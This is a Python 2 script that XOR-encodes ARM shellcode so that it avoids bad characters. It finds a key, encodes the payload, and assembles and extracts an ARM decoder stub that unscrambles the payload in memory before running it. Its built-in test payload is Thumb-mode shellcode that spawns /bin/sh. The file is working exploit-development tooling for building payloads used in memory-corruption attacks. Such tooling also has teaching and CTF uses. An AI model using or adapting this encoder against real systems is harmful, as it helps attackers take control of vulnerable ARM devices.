#!/usr/bin/env python2
import os
import sys
import tempfile

# Assembler 
BIN_AS = '/usr/bin/arm-linux-gnueabi-as'
ALTER_BIN_AS = 'as'
# Linker
BIN_LD = '/usr/bin/arm-linux-gnueabi-ld'
ALTER_BIN_LD = 'ld'
# Objcopy
BIN_OC = '/usr/bin/arm-linux-gnueabi-objcopy'
ALTER_BIN_OC = 'objcopy'
# RAW Shellcode
RAW_SC = 'raw_sc'

def SYSERR(m):
    print >> sys.stderr, "%s" % (m)

def cleanup(fn):
    for f in fn:
        if os.path.exists(f) == True:
            try:
                os.unlink(f)
            except:
                pass

def prepareCompiler():
    global BIN_AS
    global BIN_LD
    global BIN_OC

    if os.path.exists(BIN_AS) == False:
        BIN_AS = ALTER_BIN_AS

    if os.path.exists(BIN_LD) == False:
        BIN_LD = ALTER_BIN_LD

    if os.path.exists(BIN_OC) == False:
        BIN_OC = ALTER_BIN_OC

    SYSERR( "[D:] set 'as': %s" % (BIN_AS) )
    SYSERR( "[D:] set 'ld': %s" % (BIN_LD) )
    SYSERR( "[D:] set 'objcopy': %s" % (BIN_OC) )

def MakeXOR(size, xor=0x58):
    MAX_SC_SIZE = 256
    LOOP_SC_SIZE = MAX_SC_SIZE - size

    XOR="""
.global _start
.section .text

_start:
    adr r8, scode

main:
    mov r4, #%s
    adr r6, nanosleep

loop:
    cmp  r4, #%s
    bxhi r6
    sub  r4, r4, #%s
    ldrb r5, [r8, r4]
    eor  r5, r5, #%s
    strb r5, [r8, r4]
    add  r4, r4, #%s

backloop:
    b loop
backmain:
    bl main

nanosleep:
    .arm
    add r6, pc, #1
    bx r6
    .thumb
nanosleep2:
    sub r5, r5, r5
    add r5, r5, #1
    sub r6, r6, r6
    push {r5, r6}
    push {r5, r6}
    mov r0, sp
    mov r1, sp
    mov r7, #162
    svc 1

scode:
    """ % (LOOP_SC_SIZE, MAX_SC_SIZE, LOOP_SC_SIZE, xor, LOOP_SC_SIZE+1)

    fn = tempfile.mktemp() # binary file
    fn_s = fn + '.s' # as file
    fn_o = fn + '.o' # ld file
    fn_raw = fn + '.raw' # objcopy 
    will_be_deleted = [fn, fn_s, fn_o, fn_raw]

    # write a source
    open(fn_s, 'w').write(XOR)

    # compile a source
    COMPILE = '%s %s -o %s' % (BIN_AS, fn_s, fn_o)
    os.system(COMPILE)
    if os.path.exists(fn_o) == False:
        print "Failed to compile a source: %s" % (fn_s)
        cleanup(will_be_deleted)
        return ""

    # link an object
    LINKING = '%s %s -o %s' % (BIN_LD, fn_o, fn)
    os.system(LINKING)
    if os.path.exists(fn_o) == False:
        print "Failed to link an object: %s" % (fn_o)
        cleanup(will_be_deleted)
        return ""

    # objcopy 
    OBJCOPY = '%s -I elf32-little -j .text -O binary %s %s' % (BIN_OC, fn, fn_raw)
    os.system(OBJCOPY)
    if os.path.exists(fn_raw) == False:
        print "Failed to make a raw file: %s" % (fn)
        cleanup(will_be_deleted)
        return ""

    f = open(fn_raw,'rb').read()
    cleanup(will_be_deleted)

    return f

def findXorKey(sc, bc=['\x00', '\x0a']):
    """find XOR key to scramble and to avoid all of bad chars such as 0x00
        arg:
            sc (str): shellcode
            bc (list): bad chars to avoid

        return:
            key (int): XOR key

        Examples:
            >>> print findXorKey(sc)
            2
    """
    size = len(sc)
    bcs  = bc
    for i in range(0x01, 0xFF+1):
        key = i
        for s in sc:
            x = (ord(s) ^ i)
            if chr(x) in bcs:
                key = -1
                break
        if key != -1:
            return key
    return -1


def encodeShellcode(sc, key):
    """encodes shellcode with key to avoid all of bad chars such as 0x00
        arg:
            sc (str)     : shellcode
            key (int/str): XOR key

        return:
            xoredSC (str): XORed Shellcode

        Examples:
            >>> print encodeShellcode(sc, findXorKey(sc))
            '\x0e\x02\x8d\xe0\x02"\xa2\xe1\x07\x02/\xeb\x0f\x12\xa2\xe3\t\x02\x92\xed-`kl-qj\x02'
    """

    xsc = ''
    for i in range(0, len(sc)):
        xsc += chr( ord(sc[i]) ^ key )
    
    return xsc

def checkBadChar(sc, bc=[0x00, 0x0a]):
    from collections import defaultdict
    bcs = defaultdict(int)
    size = len(sc)
    for s in sc:
        if s in bc:
            bcs[s] += 1

    return bcs

if __name__ == '__main__':
    # for testing
    # /bin/sh in thumb mode
    SC = "02a000220b2705b4694601df2f62696e2f7368000000".decode('hex')
    #SC = sys.stdin.read()

    prepareCompiler()

    # find xor key to xor the shellcode
    key = findXorKey(SC)
    SYSERR( "Found a xor key: %s" % key )
    # encode with xor key
    XORSC = encodeShellcode(SC, key)
    # build a decoder
    XORER = MakeXOR(len(XORSC), key)
    rv = checkBadChar(XORER+XORSC)
    if len(rv) != 0:
        SYSERR("!!! Bad char has been found in shellcode. Please check out")  
    else:
        SYSERR( "Shellcode: size - %d" % (len(XORSC)) )
        SYSERR( "Decoder  : size - %d" % (len(XORER)) )
        if os.path.exists(RAW_SC) == True:
            os.unlink(RAW_SC)
        open(RAW_SC, 'wb').write(XORER + XORSC)

    print XORSC #.encode('hex')
